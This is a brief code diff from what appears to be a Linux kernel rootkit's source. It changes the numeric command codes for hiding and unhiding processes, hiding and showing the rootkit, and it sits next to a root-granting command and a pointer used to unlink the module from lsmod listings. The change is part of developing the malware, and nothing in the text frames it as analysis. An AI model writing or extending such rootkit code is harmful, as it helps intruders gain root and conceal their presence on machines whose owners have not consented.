@@ -21,9 +21,9 @@
 #define PF_INVISIBLE 0x10000000
 
 #define GET_ROOT 64
-#define HIDE_UNHIDE_PROCESS 65
-#define HIDE_ROOTKIT 66
-#define SHOW_ROOTKIT 67
+#define HIDE_UNHIDE_PROCESS 31
+#define HIDE_ROOTKIT 32
+#define SHOW_ROOTKIT 33
 
 static struct list_head *prev_module_in_proc_modules_lsmod;
 
